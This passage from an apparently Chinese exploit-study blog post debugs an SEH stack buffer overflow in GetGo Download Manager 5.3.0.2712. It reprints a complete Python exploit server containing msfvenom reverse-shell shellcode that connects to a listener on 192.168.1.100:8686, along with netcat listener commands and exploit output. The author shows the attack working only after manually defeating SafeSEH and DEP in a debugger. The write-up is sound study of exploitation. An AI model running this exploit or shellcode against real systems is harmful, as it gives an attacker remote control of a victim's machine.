"\x01\xbe\x79\x71\x4c\x41\x54\xb6\x69\xc2\x5c\x47\x8e"</span><br><span class="line">buf += "\xda\x15\x42\xca\x5c\xc6\x3e\x43\x09\xe8\xed\x64\x18"</span><br></pre></td></tr></table></figure>
+<h2 id="调试exp"><a href="#调试exp" class="headerlink" title="调试exp"></a>调试exp</h2><p>victim上nc在8686端口等待：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:\Documents and Settings\Desktop&gt;nc -lvv -p 8686</span><br><span class="line">listening on [any] 8686 ...</span><br></pre></td></tr></table></figure>
+<p>在victim上安装GetGo并运行，使用Immunity Debugger附加：</p>
+<p><img src="/images/bin-security/stack-based/180703_1.png" alt=""></p>
+<p><img src="/images/bin-security/stack-based/180703_2.png" alt=""></p>
+<p>先看看地址0x72d11f39这个pop|pop|ret是否正确，看了一下地址空间，发现根本不存在。。。</p>
+<p>只能自力更生重新找一个pop|pop|ret。为了保证指令的稳定性以及可用性，我们尽量在non-ASLR &amp;&amp; noSafeSEH的模块上查找。</p>
+<p>使用mona插件探测一下noaslr:</p>
+<p><img src="/images/bin-security/stack-based/180703_3.png" alt=""></p>
+<p>看到这儿就基本凉凉了，有两个模块尽管没有ASLR，却都开启了SafeSEH。SafeSEH是一定要不得的，所以只好退而求其次，ASLR就ASLR吧，至少本地能过:( </p>
+<p><img src="/images/bin-security/stack-based/180703_4.png" alt=""></p>
+<p>彻底凉了，现在我明白为什么提交者在XP sp3上测试了。。。</p>
+<p>不过既然走到这儿了，我们就继续验证一下问题是否存在吧，忽略SafeSEH，先在GetGo.exe空间和Resource_En.dll空间中找一个pop|pop|ret。</p>
+<p><img src="/images/bin-security/stack-based/180703_5.png" alt=""></p>
+<p>忽然发现GetGo空间的地址存在bad byte——“\x00”，根据提交者在msfvenom的-b参数可知这可能会引起截断，而Resource_En.dll中找了一圈却一个都没有。</p>
+<p>算了，ASLR也不要求了，直接kernel32.dll吧，至少本次系统关机前都是稳定的。。。</p>
+<p><img src="/images/bin-security/stack-based/180703_6.png" alt=""></p>
+<p>改写的exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Exploit Author: bzyo</span></span><br><span class="line"><span class="comment"># Twitter: @bzyo_</span></span><br><span class="line"><span class="comment"># Exploit Title: GetGo Download Manager 5.3.0.2712 - Remote Buffer Overflow (SEH)</span></span><br><span class="line"><span class="comment"># Date: 02-24-2018</span></span><br><span class="line"><span class="comment"># Vulnerable Software: GetGo Download Manager 5.3.0.2712</span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://www.getgosoft.com/</span></span><br><span class="line"><span class="comment"># Version: 5.3.0.2712</span></span><br><span class="line"><span class="comment"># Software Link: https://www.exploit-db.com/apps/b26d82eadef93531f8beafac6105ef13-GetGoDMSetup.exe</span></span><br><span class="line"><span class="comment"># Tested On: Windows XP SP3</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># PoC: </span></span><br><span class="line"><span class="comment"># 1. setup listener 443 on attacking machine</span></span><br><span class="line"><span class="comment"># 2. run script on attacking machine</span></span><br><span class="line"><span class="comment"># 3. open app on victim machine</span></span><br><span class="line"><span class="comment"># 4. go to download</span></span><br><span class="line"><span class="comment"># 5. select new, add http://attackerip to URL, index.html to File Name, and select OK</span></span><br><span class="line"><span class="comment"># 6. check listener, remote shell</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line">host = <span class="string">"0.0.0.0"</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">  </span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.bind((host, port))</span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n[+] listening on %d ..."</span> % port</span><br><span class="line"> </span><br><span class="line">bz, addr = s.accept()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] connection accepted from %s"</span> % addr[<span class="number">0</span>]</span><br><span class="line"> </span><br><span class="line">junk = <span class="string">"A"</span>*<span class="number">20</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#jump 6 </span></span><br><span class="line">nseh = <span class="string">"\xeb\x06\x90\x90"</span></span><br><span class="line"> </span><br><span class="line">seh = <span class="string">"\x99\x89\xc5\x76"</span>	<span class="comment"># 这里和图中的不一致是因为我重启了虚拟机。。。</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=8686 -b "\x00" -f c</span></span><br><span class="line"><span class="comment">#Payload size: 351 bytes</span></span><br><span class="line">buf =  <span class="string">""</span></span><br><span class="line">buf += <span class="string">"\xd9\xcf\xd9\x74\x24\xf4\xba\xa3\xfc\xc8\xfe\x5e\x2b"</span></span><br><span class="line">buf += <span class="string">"\xc9\xb1\x52\x83\xc6\x04\x31\x56\x13\x03\xf5\xef\x2a"</span></span><br><span class="line">buf += <span class="string">"\x0b\x05\xe7\x29\xf4\xf5\xf8\x4d\x7c\x10\xc9\x4d\x1a"</span></span><br><span class="line">buf += <span class="string">"\x51\x7a\x7e\x68\x37\x77\xf5\x3c\xa3\x0c\x7b\xe9\xc4"</span></span><br><span class="line">buf += <span class="string">"\xa5\x36\xcf\xeb\x36\x6a\x33\x6a\xb5\x71\x60\x4c\x84"</span></span><br><span class="line">buf += <span class="string">"\xb9\x75\x8d\xc1\xa4\x74\xdf\x9a\xa3\x2b\xcf\xaf\xfe"</span></span><br><span class="line">buf += <span class="string">"\xf7\x64\xe3\xef\x7f\x99\xb4\x0e\x51\x0c\xce\x48\x71"</span></span><br><span class="line">buf += <span class="string">"\xaf\x03\xe1\x38\xb7\x40\xcc\xf3\x4c\xb2\xba\x05\x84"</span></span><br><span class="line">buf += <span class="string">"\x8a\x43\xa9\xe9\x22\xb6\xb3\x2e\x84\x29\xc6\x46\xf6"</span></span><br><span class="line">buf += <span class="string">"\xd4\xd1\x9d\x84\x02\x57\x05\x2e\xc0\xcf\xe1\xce\x05"</span></span><br><span class="line">buf += <span class="string">"\x89\x62\xdc\xe2\xdd\x2c\xc1\xf5\x32\x47\xfd\x7e\xb5"</span></span><br><span class="line">buf += <span class="string">"\x87\x77\xc4\x92\x03\xd3\x9e\xbb\x12\xb9\x71\xc3\x44"</span></span><br><span class="line">buf += <span class="string">"\x62\x2d\x61\x0f\x8f\x3a\x18\x52\xd8\x8f\x11\x6c\x18"</span></span><br><span class="line">buf += <span class="string">"\x98\x22\x1f\x2a\x07\x99\xb7\x06\xc0\x07\x40\x68\xfb"</span></span><br><span class="line">buf += <span class="string">"\xf0\xde\x97\x04\x01\xf7\x53\x50\x51\x6f\x75\xd9\x3a"</span></span><br><span class="line">buf += <span class="string">"\x6f\x7a\x0c\xec\x3f\xd4\xff\x4d\xef\x94\xaf\x25\xe5"</span></span><br><span class="line">buf += <span class="string">"\x1a\x8f\x56\x06\xf1\xb8\xfd\xfd\x92\x06\xa9\xfc\x06"</span></span><br><span class="line">buf += <span class="string">"\xef\xa8\xfe\xe7\x01\x25\x18\x8d\xcd\x60\xb3\x3a\x77"</span></span><br><span class="line">buf += <span class="string">"\x29\x4f\xda\x78\xe7\x2a\xdc\xf3\x04\xcb\x93\xf3\x61"</span></span><br><span class="line">buf += <span class="string">"\xdf\x44\xf4\x3f\xbd\xc3\x0b\xea\xa9\x88\x9e\x71\x29"</span></span><br><span class="line">buf += <span class="string">"\xc6\x82\x2d\x7e\x8f\x75\x24\xea\x3d\x2f\x9e\x08\xbc"</span></span><br><span class="line">buf += <span class="string">"\xa9\xd9\x88\x1b\x0a\xe7\x11\xe9\x36\xc3\x01\x37\xb6"</span></span><br><span class="line">buf += <span class="string">"\x4f\x75\xe7\xe1\x19\x23\x41\x58\xe8\x9d\x1b\x37\xa2"</span></span><br><span class="line">buf += <span class="string">"\x49\xdd\x7b\x75\x0f\xe2\x51\x03\xef\x53\x0c\x52\x10"</span></span><br><span class="line">buf += <span class="string">"\x5b\xd8\x52\x69\x81\x78\x9c\xa0\x01\x88\xd7\xe8\x20"</span></span><br><span class="line">buf += <span class="string">"\x01\xbe\x79\x71\x4c\x41\x54\xb6\x69\xc2\x5c\x47\x8e"</span></span><br><span class="line">buf += <span class="string">"\xda\x15\x42\xca\x5c\xc6\x3e\x43\x09\xe8\xed\x64\x18"</span></span><br><span class="line"></span><br><span class="line">reverse = buf</span><br><span class="line">fill = <span class="string">"D"</span>*(<span class="number">4055</span> - len(reverse))</span><br><span class="line"> </span><br><span class="line">payload = junk + nseh + seh + reverse + fill</span><br><span class="line"> </span><br><span class="line">buffer = payload + <span class="string">"\r"</span></span><br><span class="line">buffer+= payload + <span class="string">"\r"</span></span><br><span class="line">buffer+= payload + <span class="string">"\r\n"</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> bz.recv(<span class="number">1000</span>)</span><br><span class="line">bz.send(buffer)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] sending buffer ok\n"</span></span><br><span class="line"> </span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line">bz.close()</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+<p>运行起来后，会在tcp 80端口监听。此后在victim GetGo点击下载，url填充<a href="http://192.168.1.100/" target="_blank" rel="noopener">http://192.168.1.100/</a></p>
+<p>此时，我们的attack exp.py程序有了反应:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[+] listening on 80 ...</span><br><span class="line">[+] connection accepted from 192.168.1.101</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 192.168.1.100</span><br><span class="line"></span><br><span class="line">Accept: */*</span><br><span class="line"></span><br><span class="line">Range: bytes=0-</span><br><span class="line"></span><br><span class="line">User-Agent: GetGo Download Manager 5.0 (www.getgosoft.com)Pragma: no-cache</span><br><span class="line"></span><br><span class="line">Cache-Control: no-cache</span><br><span class="line"></span><br><span class="line">Connection: Keep-Alive</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] sending buffer ok</span><br></pre></td></tr></table></figure>
+<p>而victim虚拟机中程序抛异常:</p>
+<p><img src="/images/bin-security/stack-based/180703_7.png" alt=""></p>
+<p>此时的SEH链:</p>
+<p><img src="/images/bin-security/stack-based/180703_8.png" alt=""></p>
+<p>很好，看起来我们成功覆盖了第二个SEH块，但因为SafeSEH的关系，当第一个SEH返回表示继续Continue时，程序会先检查第二个SEH块的正确性，所以我们先在第一个SEH handler的地址下断点，执行过去：</p>
+<p><img src="/images/bin-security/stack-based/180703_9.png" alt=""></p>
+<p>一路跟随到这里：</p>
+<p><img src="/images/bin-security/stack-based/180703_10.png" alt=""></p>
+<p>由于我本地离线没有符号表，所以ntdll的函数名称没有被解析出来，实际上CALL ntdll.7716F76B就是对SEH Handler的检查（因为SafeSEH的缘故，会有这里的查表检查），我把返回结果AL改为1（非法时AL是0），让下面的JE不跳转。</p>
+<p>此后，就会跳到jmp eip+6处：</p>
+<p><img src="/images/bin-security/stack-based/180703_11.png" alt=""></p>
+<p>由于我调试了多次和ASLR的关系，每次地址都不太一样，但不影响正确性。</p>
+<p>此后，又遇到了一个问题，当继续执行时发现又抛异常了，指令无法执行，这其实是因为DEP的关系。</p>
+<p><img src="/images/bin-security/stack-based/180703_12.png" alt=""></p>
+<p>这就非常难受了，只好手动为stack增加可执行权限：</p>
+<p><img src="/images/bin-security/stack-based/180703_13.png" alt=""></p>
+<p>此后继续运行，我们栈空间上的shellcode成功运行。在attacker机器上会看到shell成功反弹：</p>
+<p><img src="/images/bin-security/stack-based/180703_14.png" alt=""></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>提交者是在XP SP3上进行测试的，但我印象中XP SP3也是有DEP、ASLR等保护的，所以对于他的测试环境我表示质疑。另一方面也可以看到尽管程序存在着经典的栈溢出漏洞，但SEH覆盖的手法在面对3大mitigation（ASLR、DEP和SafeSEH ）开启的状况下可谓是举步维艰，如果不是一步一步在调试器中强行修改指令结果和内存Stack权限，我们的SEH覆盖手法无疑是失败的。</p>
+<p>对于ASLR、DEP和SafeSEH要如何正大光明的绕过，而不是在调试器中掩耳盗铃呢？实际上他们都取决于具体的环境，同时也往往依赖其他的漏洞来配合，在mitigation大行其道的现代漏洞利用环境中，以单一的高质量漏洞一剑封喉的情况越来越少，往往都是多个漏洞组合在一起，形成一整条攻击链。</p>
+<p>当然，这些也就是后话了，本文的宗旨仅仅在于通过漏洞实例演示SEH覆盖方法的可行性，并真刀实枪的阐释在现代mitigation重重保护的环境下传统方法无用武之地的窘境。</p>
+
+      
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2018/07/07/一次失败的栈溢出(SEH)之GetGo Download Manager/">一次失败的栈溢出(SEH)之GetGo Download Manager</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 r00tk1t 的个人博客">r00tk1t</a></p>
+        <p><span>发布时间:</span>2018年07月07日 - 11时12分</p>
+        <p><span>最后更新:</span>2020年10月20日 - 21时01分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2018/07/07/一次失败的栈溢出(SEH)之GetGo Download Manager/" title="一次失败的栈溢出(SEH)之GetGo Download Manager">https://r00tk1ts.github.io/2018/07/07/一次失败的栈溢出(SEH)之GetGo Download Manager/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://r00tk1ts.github.io/2018/07/07/一次失败的栈溢出(SEH)之GetGo Download Manager/　　作者: r00tk1t" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a href="/2018/08/13/Linux内存管理-进程地址空间/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          Linux内核学习——内存管理之进程地址空间
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/06/28/DNSTracer 1.9栈溢出漏洞[CVE-2017-9430]/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">DNSTracer 1.9栈溢出漏洞[CVE-2017-9430]</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#一次失败的栈溢出-SEH-之GetGo-Download-Manager"><span class="toc-number">1.</span> <span class="toc-text">一次失败的栈溢出(SEH)之GetGo Download Manager</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#侦查"><span class="toc-number">1.1.</span> <span class="toc-text">侦查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#调试exp"><span class="toc-number">1.2.</span> <span class="toc-text">调试exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">1.3.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+</div>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
+
+
+
+
+
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2018/08/13/Linux内存管理-进程地址空间/" title="上一篇: Linux内核学习——内存管理之进程地址空间">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2018/06/28/DNSTracer 1.9栈溢出漏洞[CVE-2017-9430]/" title="下一篇: DNSTracer 1.9栈溢出漏洞[CVE-2017-9430]">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/10/22/chromium-base库源码解读之引用计数拆解篇/">chromium-base库源码解读之引用计数拆解篇</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/16/深入探索禁忌目录之Effective C++篇/">深入探索禁忌目录之Effective C++篇</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/10/C++ Primer - 特殊工具与技术/">C++ Primer - 特殊工具与技术</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/08/C++ Primer - 用于大型程序的工具/">C++ Primer - 用于大型程序的工具</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/06/C++ Primer - 标准库特殊设施/">C++ Primer - 标准库特殊设施</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/03/C++ Primer - 模板与泛型编程/">C++ Primer - 模板与泛型编程</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/01/C++ Primer - 面向对象程序设计/">C++ Primer - 面向对象程序设计</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/29/C++ Primer - 重载运算与类型转换/">C++ Primer - 重载运算与类型转换</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/29/C++ Primer - 拷贝控制/">C++ Primer - 拷贝控制</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/26/C++ Primer - 动态内存/">C++ Primer - 动态内存</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/26/C++ Primer - 关联容器/">C++ Primer - 关联容器</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/24/C++ Primer - 泛型算法/">C++ Primer - 泛型算法</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/24/C++ Primer - 顺序容器/">C++ Primer - 顺序容器</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/21/C++ Primer - IO库/">C++ Primer - IO库</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/21/C++ Primer - 类/">C++ Primer - 类</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/20/C++ Primer - 函数/">C++ Primer - 函数</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/20/C++ Primer - 语句/">C++ Primer -语句</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/20/C++ Primer - 表达/">C++ Primer - 表达式</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/28/C++ Primer - string, vector & array/">C++ Primer - string, vector, array</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/28/C++ Primer - 变量和基本类型/">C++ Primer - 变量和基本类型</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/25/C++ Templates Note - 类模板/">C++ Templates Note - 类模板</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/25/C++ Templates Note - 函数模板/">C++ Templates Note- 函数模板</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/13/Linux内存管理-进程地址空间/">Linux内核学习——内存管理之进程地址空间</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/07/一次失败的栈溢出(SEH)之GetGo Download Manager/">一次失败的栈溢出(SEH)之GetGo Download Manager</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/28/DNSTracer 1.9栈溢出漏洞[CVE-2017-9430]/">DNSTracer 1.9栈溢出漏洞[CVE-2017-9430]</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/24/A Tale of Exploit Easy RM 2 MP3 Converter/">A Tale of Exploit "Easy RM 2 MP3</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/03/chromium-sandbox-ThreadProcess-analysis/">Chromium-sandbox-ThreadProcess-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/03/chromium-sandbox-Filesystem-analysis/">Chromium-sandbox-Filesystem-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/03/chromium-sandbox-LowLevelPolicy-analysis/">Chromium-sandbox-LowLevelPolicy-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/26/chromium-sandbox-PolicyEngine-analysis/">Chromium-sandbox-PolicyEngine-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/26/chromium-sandbox-Resolver-analysis/">Chromium-sandbox-Resolver-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/26/chromium-sandbox-Interception/">Chromium-sandbox-Interception-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/21/chromium-sandbox-HandleCloser-analysis/">Chromium-sandbox-HandleCloser-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/20/chromium-sandbox-SharedMemIPC/">Chromium-sandbox-SharedMemIPC-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/19/chromium-sandbox-Crosscall-analysis/">Chromium-sandbox-crosscall-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/19/chromium-sandbox-AlternateDesktop-analysis/">Chromium-sandbox-AlternateDesktop-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/19/chromium-sandbox-Tokens-analysis/">Chromium-sandbox-Tokens-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/14/chromium-sandbox-Job-analysis/">Chromium-sandbox-Job-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/13/chromium-sandbox-TargetPolicy-analysis/">Chromium-sandbox-TargetPolicy-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/13/chromium-sandbox-TargetProcess-analysis/">Chromium-sandbox-TargetProcess-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/13/chromium-sandbox-TargetServices-analysis/">Chromium-sandbox-TargetServices-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/13/chromium-sandbox-BrokerServices/">Chromium-sandbox-BrokerServices-analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/05/x41-浏览器安全白皮书笔记/">X41-浏览器安全白皮书读书笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/22/Windows系统机制之同步/">Windows系统机制之同步</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/21/Windows系统机制之对象管理器/">Windows系统机制之对象管理器</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/21/Windows系统机制之陷阱分发/">Windows系统机制之陷阱分发</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/21/Bitmaps轶事：Windows 10纪念版前的GDI对象泄露/">Bitmap轶事：Windows 10纪念版后的GDI对象泄露</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/20/理解池污染三部曲/">理解池污染三部曲</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/19/内核利用程序之Razer rzpnk.sys中的逻辑bug/">Windows exploit系列教程第十九篇：内核利用程序之Razer rzpnk.sys中的逻辑bug</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/19/内核利用程序之RS2 Bitmap巫术/">Windows exploit系列教程第十八篇：内核利用程序之RS2 Bitmap巫术</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/15/内核利用程序之滥用GDI Bitmap/">Windows exploit系列教程第十七部分：内核利用程序之任意位置任意写</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/14/内核利用程序之池溢出/">Windows exploit系列教程第十六部分：内核利用程序之池溢出</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/14/内核利用程序之UAF/">Windows exploit系列教程第十五部分：内核利用程序之UAF</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/10/coin1/">Writeup.pwnable.kr系列之coin1</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/10/shellshock/">Writeup.pwnable.kr系列之shellshock</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/09/mistake/">Writeup.pwnable.kr系列之mistake</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/07/leg/">Writeup.pwnable.kr系列之leg</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/06/input/">Writeup.pwnable.kr系列之input</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/05/random/">Writeup.pwnable.kr系列之random</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/05/passcode/">Writeup.pwnable.kr系列之passcode</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/04/flag/">Writeup.pwnable.kr系列之flag</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/04/bof/">Writeup.pwnable.kr系列之bof</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/03/collision/">Writeup.pwnable.kr系列之collision</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/03/fd/">Writeup.pwnable.kr系列之fd</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/26/Binary Security Assembly/">Binary-Security-Assembly</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/07/内核利用程序之整数溢出/">Windows exploit系列教程第十四部分：内核利用程序之整数溢出</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/06/内核利用程序之未初始化栈变量/">Windows exploit系列教程第十三部分：内核利用程序之未初始化栈变量</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/06/内核利用程序之空指针引用/">Windows exploit系列教程第十二部分：内核利用程序之空指针引用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/01/内核利用程序之任意位置任意写/">Windows exploit系列教程第十一部分：内核利用程序之任意位置任意写</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/15/ring0层exp原语之滥用GDI/">ring0层exp原语之滥用GDI</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/14/Windows x64内核提权/">Windows x64内核提权</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/14/关键的Windows内核数据结构一览（下）/">关键的Windows内核数据结构一览（下）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/08/关键的Windows内核数据结构一览（上）/">关键的Windows内核数据结构一览（上）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/06/内核利用程序开发之栈溢出/">Windows 